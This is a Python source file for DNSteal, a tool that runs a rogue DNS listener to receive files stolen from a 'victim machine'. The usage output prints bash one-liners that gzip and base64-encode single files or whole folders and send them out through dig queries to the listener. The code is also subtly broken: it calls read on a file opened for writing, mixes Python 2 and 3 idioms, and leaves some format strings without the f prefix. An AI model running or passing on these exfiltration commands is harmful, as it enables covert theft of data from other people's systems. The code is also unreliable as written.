#!/usr/bin/env python

import socket
import sys
import time
import hashlib
import zlib
import re
import base64

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

VERSION = "2.0"


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.data_text = ""

        tipo = (ord(data[2]) >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = ord(data[ini])
        while lon != 0:
            self.data_text += data[ini + 1:ini + lon + 1] + "."
            ini += lon + 1
            lon = ord(data[ini])

    def request(self, ip):
        packet = ""
        if self.data_text:
            packet += self.data[:2] + "\x81\x80"
            packet += (
                self.data[4:6] + self.data[4:6] + "\x00\x00\x00\x00"
            )  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += "\xc0\x0c"  # Pointer to domain name
            packet += "\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # Response type, ttl and resource data length -> 4 bytes
            packet += str.join(
                "", map(lambda x: chr(int(x)), ip.split("."))
            )  # 4bytes of IP
        return packet


def save_to_file(r_data, z, v):

    print("\n")

    for key, value in r_data.iteritems():
        file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
        fname = f"recieved_{file_seed}_{key}"
        flatdata = ""

        for block in value:
            flatdata += block[:-1].replace(
                "*", "+"
            )  # fix data (remove hyphens at end, replace * with + because of dig!)

        try:
            with open(fname, "wb") as f:
                f.read()
        except IOError:
            print(f"{RED}[Error]{RESET} Opening file {fname} to save data.")
            exit(1)

        try:
            if v:
                print(f"{YELLOW}[Info]{RESET} base64 decoding data ({key}).")
            flatdata = base64.b64decode(
                flatdata
            )  # test if padding correct by using a try/catch
        except (ValueError, TypeError):
            f.close()
            print(f"{RED}[Error]{RESET} Incorrect padding on base64 encoded data..")
            exit(1)

        if z:
            if v:
                print(f"{YELLOW}[Info]{RESET} Unzipping data ({key}).")

            try:
                x = zlib.decompressobj(16 + zlib.MAX_WBITS)
                flatdata = x.decompress(flatdata)
            except zlib.error:
                print(
                    f"{RED}[Error]{RESET} Could not unzip data, did you specify the -z switch ?"
                )
                exit(1)

            print(f"{YELLOW}[Info]{RESET} Saving recieved bytes to './{fname}'")
            f.write(flatdata)
            f.close()
        else:
            print(f"{YELLOW}[Info]{RESET} Saving bytes to './{fname}'")
            f.write(flatdata)
            f.close()

        with open(fname, "r") as f:
            md5sum = hashlib.md5(f.read()).hexdigest()
            print(f"{GREEN}[md5sum]{RESET} {md5sum}")


def usage(str=""):

    banner()
    print(f"Usage: python {sys.argv[0]} [listen_address] [options]")
    print("\nOptions:")
    print("-z\tUnzip incoming files.")
    print("-v\tVerbose output.")
    print("-h\tThis help menu")
    print("\n")
    print("Advanced:")
    print("-b\tBytes to send per subdomain                 (default = 57, max=63)")
    print(
        "-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)"
    )
    print("-f\tLength reserved for filename per request    (default = 17)")
    print("\n")
    print(f"{GREEN}$ python {sys.argv[0]} -z 127.0.0.1{RESET}")
    print("\n")
    print(
        f"{RED}-------- Do not change the parameters unless you understand! --------{RESET}"
    )
    print("\n")
    print("The query length cannot exceed 253 bytes. This is including the filename.")
    print("The subdomains lengths cannot exceed 63 bytes.")
    print("\n")
    print("Advanced: ")
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
    )
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
    )
    print(
        f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
    )
    print("\n")
    print(str)


def p_cmds(s, b, ip, z):

    print(
        f"{GREEN}[+]{RESET} On the victim machine, use any of the following commands:"
    )
    print(
        f"{GREEN}[+]{RESET} Remember to set {YELLOW}filename{RESET} for individual file transfer."
    )
    print("\n")

    if z:
        print(f"{YELLOW}[?]{RESET} Copy individual file (ZIP enabled)")
        print(
            f"""{RED}\x23{RESET} {YELLOW}f=file.txt{RESET}; s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
        )
        print(f"{YELLOW}[?]{RESET} Copy entire folder (ZIP enabled)")
        print(
            f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
        )
    else:
        print(f"{YELLOW}[?]{RESET} Copy individual file")
        print(
            f"""{RED}\x23{RESET} {YELLOW}f=file.txt{RESET}; s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
        )
        print(f"{YELLOW}[?]{RESET} Copy entire folder")
        print(
            f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
        )


def banner():

    print("\033[1;32m")
    print(
        f"""
     ___  _  _ ___ _            _
    |   \\| \\| / __| |_ ___ __ _| |
    | |) | .` \\__ \\  _/ -_) _` | |
    |___/|_|\\_|___/\\__\\___\\__,_|_|v{VERSION}
    -- https://github.com/m57/dnsteal.git --\033[0m

    Stealthy file extraction via DNS requests
        """
    )


if __name__ == "__main__":

    z = False
    s = 4
    b = 57
    flen = 17
    v = False
    regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

    if "-h" in sys.argv or len(sys.argv) < 2:
        usage()
        exit(1)

    ip = sys.argv[1]

    if re.match(regx_ip, ip) is None:
        usage("{RED}[Error]{RESET} First argument must be listen address.")
        exit(1)

    if "-z" in sys.argv:
        z = True
    if "-s" in sys.argv:
        s = int(sys.argv[sys.argv.index("-s") + 1])
    if "-b" in sys.argv:
        b = int(sys.argv[sys.argv.index("-b") + 1])
    if "-f" in sys.argv:
        flen = int(sys.argv[sys.argv.index("-f") + 1])
    if "-v" in sys.argv:
        v = True

    if (b > 63) or ((b * s) > 253) or (((b * s) + flen) > 253):
        usage("{RED}[Error]{RESET} Entire query cannot be > 253. Read help (-h)")

    banner()

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip, 53))
    except socket.error:
        print(f"{RED}[Error]{RESET} Cannot bind to address {ip}:53")
        exit(1)

    print(f"{GREEN}[+]{RESET} DNS listening on {ip}:53'")
    p_cmds(s, b, ip, z)
    print(f"{GREEN}[+]{RESET} Once files have sent, use Ctrl+C to exit and save.\n")

    try:
        r_data = {}
        while 1:
            # There is a bottle neck in this function, if very slow PC, will take
            # slightly longer to send as this main loop recieves the data from victim.

            data, addr = udp.recvfrom(1024)
            p = DNSQuery(data)
            udp.sendto(p.request(ip), addr)

            req_split = p.data_text.split(".")
            req_split.pop()  # fix trailing dot... cba to fix this

            dlen = len(req_split)
            fname = ""
            tmp_data = []

            for n in range(0, dlen):
                if req_split[n][len(req_split[n]) - 1] == "-":
                    tmp_data.append(req_split[n])
                else:
                    # Filename
                    fname += req_split[n] + "."

            fname = fname[:-1]

            if fname not in r_data:
                r_data[fname] = []

            print(f"{YELLOW}[>]{RESET} len: '{len(p.data_text)} bytes'\t- {fname}")
            if v:
                print(f"{BLUE}[>>]{RESET} {p.data_text} -> {ip} :53")

            for d in tmp_data:
                r_data[fname].append(d)

    except KeyboardInterrupt:
        save_to_file(r_data, z, v)
        print("\n\033[1;31m[!]\033[0m Closing...")
        udp.close()
